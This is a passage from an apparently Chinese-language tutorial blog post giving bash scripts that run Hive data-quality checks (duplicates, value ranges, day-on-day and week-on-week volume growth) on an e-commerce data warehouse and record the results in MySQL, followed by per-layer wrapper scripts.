class="built_in">getopts</span> <span class="string">"t:d:c:s:x:l:"</span> arg; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$arg</span> <span class="keyword">in</span></span><br><span class="line">  <span class="comment"># 要处理的表名</span></span><br><span class="line">  t)</span><br><span class="line">    TABLE=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 日期</span></span><br><span class="line">  d)</span><br><span class="line">    DT=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 要计算重复值的列名</span></span><br><span class="line">  c)</span><br><span class="line">    COL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 重复值指标下限</span></span><br><span class="line">  s)</span><br><span class="line">    MIN=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 重复值指标上限</span></span><br><span class="line">  x)</span><br><span class="line">    MAX=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 告警级别</span></span><br><span class="line">  l)</span><br><span class="line">    LEVEL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  ?)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"unkonw argument"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果dt和level没有设置，那么默认值dt是昨天 告警级别是0</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line">[ <span class="string">"<span class="variable">$LEVEL</span>"</span> ] || LEVEL=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数仓DB名称</span></span><br><span class="line">HIVE_DB=gmall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询引擎</span></span><br><span class="line">HIVE_ENGINE=hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关配置</span></span><br><span class="line">mysql_user=<span class="string">"root"</span></span><br><span class="line">mysql_passwd=<span class="string">"000000"</span></span><br><span class="line">mysql_host=<span class="string">"hadoop102"</span></span><br><span class="line">mysql_DB=<span class="string">"data_supervisor"</span></span><br><span class="line">mysql_tbl=<span class="string">"duplicate"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证为hive用户，如在非安全(Hadoop未启用Kerberos认证)环境中，则无需认证</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重复值个数</span></span><br><span class="line">RESULT=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false;select count(1) from (select <span class="variable">$COL</span> from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt='<span class="variable">$DT</span>' group by <span class="variable">$COL</span> having count(<span class="variable">$COL</span>)&gt;1) t1;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果插入MySQL</span></span><br><span class="line">mysql -h<span class="string">"<span class="variable">$mysql_host</span>"</span> -u<span class="string">"<span class="variable">$mysql_user</span>"</span> -p<span class="string">"<span class="variable">$mysql_passwd</span>"</span> \</span><br><span class="line">  -e<span class="string">"INSERT INTO <span class="variable">$mysql_DB</span>.<span class="variable">$mysql_tbl</span> VALUES('<span class="variable">$DT</span>', '<span class="variable">$TABLE</span>', '<span class="variable">$COL</span>', <span class="variable">$RESULT</span>, <span class="variable">$MIN</span>, <span class="variable">$MAX</span>, <span class="variable">$LEVEL</span>)</span></span><br><span class="line"><span class="string">ON DUPLICATE KEY UPDATE \`value\`=<span class="variable">$RESULT</span>, value_min=<span class="variable">$MIN</span>, value_max=<span class="variable">$MAX</span>, notification_level=<span class="variable">$LEVEL</span>;"</span></span><br></pre></td></tr></table></figure><p><strong>值域检查脚本</strong></p><p><a href="http://xn--Idearange-y75noo8a49u67q85snq3avjx.sh" target="_blank" rel="noopener">在Idea中创建一个文件range.sh</a>，在文件中编写如下内容：实现的主要功能是：计算超出规定值域的值的个数，并将结果和自己定义的阈值上下限，插入到MySQL表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 计算某一列异常值个数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"t:d:l:c:s:x:a:b:"</span> arg; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$arg</span> <span class="keyword">in</span></span><br><span class="line">  <span class="comment"># 要处理的表名</span></span><br><span class="line">  t)</span><br><span class="line">    TABLE=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 日替</span></span><br><span class="line">  d)</span><br><span class="line">    DT=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 要处理的列</span></span><br><span class="line">  c)</span><br><span class="line">    COL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 不在规定值域的值的个数下限</span></span><br><span class="line">  s)</span><br><span class="line">    MIN=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 不在规定值域的值的个数上限</span></span><br><span class="line">  x)</span><br><span class="line">    MAX=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 告警级别</span></span><br><span class="line">  l)</span><br><span class="line">    LEVEL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 规定值域为a-b</span></span><br><span class="line">  a)</span><br><span class="line">    RANGE_MIN=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  b)</span><br><span class="line">    RANGE_MAX=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  ?)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"unkonw argument"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果dt和level没有设置，那么默认值dt是昨天 告警级别是0</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line">[ <span class="string">"<span class="variable">$LEVEL</span>"</span> ] || LEVEL=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数仓DB名称</span></span><br><span class="line">HIVE_DB=gmall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询引擎</span></span><br><span class="line">HIVE_ENGINE=hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关配置</span></span><br><span class="line">mysql_user=<span class="string">"root"</span></span><br><span class="line">mysql_passwd=<span class="string">"000000"</span></span><br><span class="line">mysql_host=<span class="string">"hadoop102"</span></span><br><span class="line">mysql_DB=<span class="string">"data_supervisor"</span></span><br><span class="line">mysql_tbl=<span class="string">"rng"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证为hive用户，如在非安全(Hadoop未启用Kerberos认证)环境中，则无需认证</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询不在规定值域的值的个数</span></span><br><span class="line">RESULT=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false;select count(1) from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt='<span class="variable">$DT</span>' and <span class="variable">$COL</span> not between <span class="variable">$RANGE_MIN</span> and <span class="variable">$RANGE_MAX</span>;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果写入MySQL</span></span><br><span class="line">mysql -h<span class="string">"<span class="variable">$mysql_host</span>"</span> -u<span class="string">"<span class="variable">$mysql_user</span>"</span> -p<span class="string">"<span class="variable">$mysql_passwd</span>"</span> \</span><br><span class="line">  -e<span class="string">"INSERT INTO <span class="variable">$mysql_DB</span>.<span class="variable">$mysql_tbl</span> VALUES('<span class="variable">$DT</span>', '<span class="variable">$TABLE</span>', '<span class="variable">$COL</span>', <span class="variable">$RESULT</span>, <span class="variable">$RANGE_MIN</span>, <span class="variable">$RANGE_MAX</span>, <span class="variable">$MIN</span>, <span class="variable">$MAX</span>, <span class="variable">$LEVEL</span>)</span></span><br><span class="line"><span class="string">ON DUPLICATE KEY UPDATE \`value\`=<span class="variable">$RESULT</span>, range_min=<span class="variable">$RANGE_MIN</span>, range_max=<span class="variable">$RANGE_MAX</span>, value_min=<span class="variable">$MIN</span>, value_max=<span class="variable">$MAX</span>, notification_level=<span class="variable">$LEVEL</span>;"</span></span><br></pre></td></tr></table></figure><p><strong>数据量环比检查脚本</strong></p><p>day_on_day.sh，在文件中编写如下内容： 实现的主要功能是：计算数据量环比增长值，并将结果和自己定义的阈值上下限，插入到MySQL表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 计算一张表单日数据量环比增长值</span></span><br><span class="line"><span class="comment"># 参数解析</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"t:d:s:x:l:"</span> arg; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$arg</span> <span class="keyword">in</span></span><br><span class="line">  <span class="comment"># 要处理的表名</span></span><br><span class="line">  t)</span><br><span class="line">    TABLE=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 日期</span></span><br><span class="line">  d)</span><br><span class="line">    DT=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 环比增长指标下限</span></span><br><span class="line">  s)</span><br><span class="line">    MIN=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 环比增长指标上限</span></span><br><span class="line">  x)</span><br><span class="line">    MAX=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 告警级别</span></span><br><span class="line">  l)</span><br><span class="line">    LEVEL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  ?)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"unkonw argument"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果dt和level没有设置，那么默认值dt是昨天 告警级别是0</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line">[ <span class="string">"<span class="variable">$LEVEL</span>"</span> ] || LEVEL=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数仓DB名称</span></span><br><span class="line">HIVE_DB=gmall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询引擎</span></span><br><span class="line">HIVE_ENGINE=hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关配置</span></span><br><span class="line">mysql_user=<span class="string">"root"</span></span><br><span class="line">mysql_passwd=<span class="string">"000000"</span></span><br><span class="line">mysql_host=<span class="string">"hadoop102"</span></span><br><span class="line">mysql_DB=<span class="string">"data_supervisor"</span></span><br><span class="line">mysql_tbl=<span class="string">"day_on_day"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证为hive用户，如在非安全(Hadoop未启用Kerberos认证)环境中，则无需认证</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 昨日数据量</span></span><br><span class="line">YESTERDAY=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false; select count(1) from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt=date_add('<span class="variable">$DT</span>',-1);"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 今日数据量</span></span><br><span class="line">TODAY=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false;select count(1) from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt='<span class="variable">$DT</span>';"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算环比增长值</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$YESTERDAY</span>"</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">  RESULT=$(awk <span class="string">"BEGIN&#123;print (<span class="variable">$TODAY</span>-<span class="variable">$YESTERDAY</span>)/<span class="variable">$YESTERDAY</span>*100&#125;"</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  RESULT=10000</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果写入MySQL表格</span></span><br><span class="line">mysql -h<span class="string">"<span class="variable">$mysql_host</span>"</span> -u<span class="string">"<span class="variable">$mysql_user</span>"</span> -p<span class="string">"<span class="variable">$mysql_passwd</span>"</span> \</span><br><span class="line">  -e<span class="string">"INSERT INTO <span class="variable">$mysql_DB</span>.<span class="variable">$mysql_tbl</span> VALUES('<span class="variable">$DT</span>', '<span class="variable">$TABLE</span>', <span class="variable">$RESULT</span>, <span class="variable">$MIN</span>, <span class="variable">$MAX</span>, <span class="variable">$LEVEL</span>)</span></span><br><span class="line"><span class="string">ON DUPLICATE KEY UPDATE \`value\`=<span class="variable">$RESULT</span>, value_min=<span class="variable">$MIN</span>, value_max=<span class="variable">$MAX</span>, notification_level=<span class="variable">$LEVEL</span>;"</span></span><br></pre></td></tr></table></figure><p><strong>数据量同比检查脚本</strong></p><p>week_on_week.sh，在文件中编写如下内容： 实现的主要功能是：计算数据量同比增长值，并将结果和自己定义的阈值上下限，插入到MySQL表中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 计算一张表一周数据量同比增长值</span></span><br><span class="line"><span class="comment"># 参数解析</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">"t:d:s:x:l:"</span> arg; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$arg</span> <span class="keyword">in</span></span><br><span class="line">  <span class="comment"># 要处理的表名</span></span><br><span class="line">  t)</span><br><span class="line">    TABLE=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 日期</span></span><br><span class="line">  d)</span><br><span class="line">    DT=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 同比增长指标下限</span></span><br><span class="line">  s)</span><br><span class="line">    MIN=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 同比增长指标上限</span></span><br><span class="line">  x)</span><br><span class="line">    MAX=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  <span class="comment"># 告警级别</span></span><br><span class="line">  l)</span><br><span class="line">    LEVEL=<span class="variable">$OPTARG</span></span><br><span class="line">    ;;</span><br><span class="line">  ?)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"unkonw argument"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">    ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果dt和level没有设置，那么默认值dt是昨天 告警级别是0</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line">[ <span class="string">"<span class="variable">$LEVEL</span>"</span> ] || LEVEL=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数仓DB名称</span></span><br><span class="line">HIVE_DB=gmall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询引擎</span></span><br><span class="line">HIVE_ENGINE=hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL相关配置</span></span><br><span class="line">mysql_user=<span class="string">"root"</span></span><br><span class="line">mysql_passwd=<span class="string">"000000"</span></span><br><span class="line">mysql_host=<span class="string">"hadoop102"</span></span><br><span class="line">mysql_DB=<span class="string">"data_supervisor"</span></span><br><span class="line">mysql_tbl=<span class="string">"week_on_week"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证为hive用户，如在非安全(Hadoop未启用Kerberos认证)环境中，则无需认证</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上周数据量</span></span><br><span class="line">LASTWEEK=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false;select count(1) from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt=date_add('<span class="variable">$DT</span>',-7);"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本周数据量</span></span><br><span class="line">THISWEEK=$(<span class="variable">$HIVE_ENGINE</span> -e <span class="string">"set hive.cli.print.header=false;select count(1) from <span class="variable">$HIVE_DB</span>.<span class="variable">$TABLE</span> where dt='<span class="variable">$DT</span>';"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算增长</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$LASTWEEK</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">  RESULT=$(awk <span class="string">"BEGIN&#123;print (<span class="variable">$THISWEEK</span>-<span class="variable">$LASTWEEK</span>)/<span class="variable">$LASTWEEK</span>*100&#125;"</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  RESULT=10000</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果写入MySQL</span></span><br><span class="line">mysql -h<span class="string">"<span class="variable">$mysql_host</span>"</span> -u<span class="string">"<span class="variable">$mysql_user</span>"</span> -p<span class="string">"<span class="variable">$mysql_passwd</span>"</span> \</span><br><span class="line">  -e<span class="string">"INSERT INTO <span class="variable">$mysql_DB</span>.<span class="variable">$mysql_tbl</span> VALUES('<span class="variable">$DT</span>', '<span class="variable">$TABLE</span>', <span class="variable">$RESULT</span>, <span class="variable">$MIN</span>, <span class="variable">$MAX</span>, <span class="variable">$LEVEL</span>)</span></span><br><span class="line"><span class="string">ON DUPLICATE KEY UPDATE \`value\`=<span class="variable">$RESULT</span>, value_min=<span class="variable">$MIN</span>, value_max=<span class="variable">$MAX</span>, notification_level=<span class="variable">$LEVEL</span>;"</span></span><br></pre></td></tr></table></figure><h3 id="4-2-数仓各层检测脚本编写">4.2 数仓各层检测脚本编写</h3><p>将上一节编写的单一规则检测脚本按照数仓分层进行集成，分别编写ODS层检测脚本，DWD层检测脚本和DIM层检测脚本</p><p><strong>ODS层</strong></p><table><thead><tr><th><strong>表</strong></th><th><strong>检查项目</strong></th><th><strong>依据</strong></th><th><strong>异常值下限</strong></th><th><strong>异常值上限</strong></th></tr></thead><tbody><tr><td><strong>ods_order_info</strong></td><td>同比增长</td><td>数据总量</td><td>-10%</td><td>10%</td></tr><tr><td></td><td>环比增长</td><td>数据总量</td><td>-10%</td><td>50%</td></tr><tr><td></td><td>值域检查</td><td>final_amount</td><td>0</td><td>100</td></tr></tbody></table><p>在Idea中创建一个文件check_ods.sh，在文件中编写如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">DT=<span class="variable">$1</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查表 ods_order_info 数据量日环比增长</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -s 环比增长下限</span></span><br><span class="line"><span class="comment">#      -x 环比增长上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line">bash day_on_day.sh -t ods_order_info -d <span class="string">"<span class="variable">$DT</span>"</span> -s -10 -x 10 -l 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查表 ods_order_info 数据量周同比增长</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -s 同比增长下限</span></span><br><span class="line"><span class="comment">#      -x 同比增长上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line">bash week_on_week.sh -t ods_order_info -d <span class="string">"<span class="variable">$DT</span>"</span> -s -10 -x 50 -l 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查表 ods_order_info 订单异常值</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -s 指标下限</span></span><br><span class="line"><span class="comment">#      -x 指标上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line"><span class="comment">#      -a 值域下限</span></span><br><span class="line"><span class="comment">#      -b 值域上限</span></span><br><span class="line">bash range.sh -t ods_order_info -d <span class="string">"<span class="variable">$DT</span>"</span> -c final_amount -a 0 -b 100000 -s 0 -x 100 -l 1</span><br></pre></td></tr></table></figure><p><strong>DWD层</strong></p><table><thead><tr><th><strong>表</strong></th><th><strong>检查项目</strong></th><th><strong>依据</strong></th><th><strong>异常值下限</strong></th><th><strong>异常值上限</strong></th></tr></thead><tbody><tr><td><strong>dwd_order_info</strong></td><td>空值检查</td><td>id</td><td>0</td><td>10</td></tr><tr><td></td><td>重复值检查</td><td>id</td><td>0</td><td>5</td></tr></tbody></table><p>在Idea中创建一个文件check_dwd.sh，在文件中编写如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">DT=<span class="variable">$1</span></span><br><span class="line">[ <span class="string">"<span class="variable">$DT</span>"</span> ] || DT=$(date -d <span class="string">'-1 day'</span> +%F)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查表 dwd_order_info 重复ID</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -c 检查重复值的列</span></span><br><span class="line"><span class="comment">#      -s 异常指标下限</span></span><br><span class="line"><span class="comment">#      -x 异常指标上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line">bash duplicate.sh -t dwd_order_info -d <span class="string">"<span class="variable">$DT</span>"</span> -c id -s 0 -x 5 -l 0</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查表 dwd_order_info 的空ID</span></span><br><span class="line"><span class="comment">#参数： -t 表名</span></span><br><span class="line"><span class="comment">#      -d 日期</span></span><br><span class="line"><span class="comment">#      -c 检查空值的列</span></span><br><span class="line"><span class="comment">#      -s 异常指标下限</span></span><br><span class="line"><span class="comment">#      -x 异常指标上限</span></span><br><span class="line"><span class="comment">#      -l 告警级别</span></span><br><span class="line">bash null_id.sh -t dwd_order_info -d <span class="string">"<span class="variable">$DT</span>"</span> -c id -s 0 -x 10 -l 